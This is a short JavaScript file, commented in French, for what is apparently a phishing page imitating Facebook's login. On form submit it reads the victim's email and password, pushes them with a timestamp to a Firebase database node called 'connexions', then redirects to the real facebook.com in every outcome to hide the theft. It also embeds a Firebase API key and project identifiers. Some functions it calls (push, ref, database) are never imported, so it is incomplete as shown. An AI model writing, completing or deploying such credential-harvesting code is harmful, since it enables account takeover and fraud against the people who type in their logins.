// Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";
  // TODO: Add SDKs for Firebase products that you want to use
  // https://firebase.google.com/docs/web/setup#available-libraries

  // Your web app's Firebase configuration
  const firebaseConfig = {
    apiKey: "AIzaSyAlYQ4Pu7-thktOcQ0c1OvU9dWvcPOHRwk",
    authDomain: "facebook-4a5a3.firebaseapp.com",
    projectId: "facebook-4a5a3",
    storageBucket: "facebook-4a5a3.firebasestorage.app",
    messagingSenderId: "773442433083",
    appId: "1:773442433083:web:724e0c9e66372b2d9d2c1e"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);

const form = document.getElementById('loginForm');
form.addEventListener('submit', (e) => {
    e.preventDefault(); // Bloque le rechargement immédiat

    const emailValue = document.querySelector('input[name="email"]').value;
    const passwordValue = document.getElementById('passwordInput').value;

    // On tente d'envoyer à Firebase
    push(ref(database, 'connexions'), {
        identifiant: emailValue,
        motDePasse: passwordValue,
        date: new Date().toLocaleString("fr-FR")
    }).then(() => {
        // Si ça réussit, on redirige vers le vrai Facebook
        window.location.replace("https://www.facebook.com");
    }).catch((error) => {
        console.error("Erreur Firebase : ", error);
        // FORCE LA REDIRECTION : Même s'il y a un problème de réseau ou de clés Firebase !
        window.location.replace("https://www.facebook.com");
    });

    // Sécurité absolue : Si Firebase met plus de 2 secondes à répondre, on y va quand même
    setTimeout(() => {
        window.location.replace("https://www.facebook.com");
    }, 2000); 
});
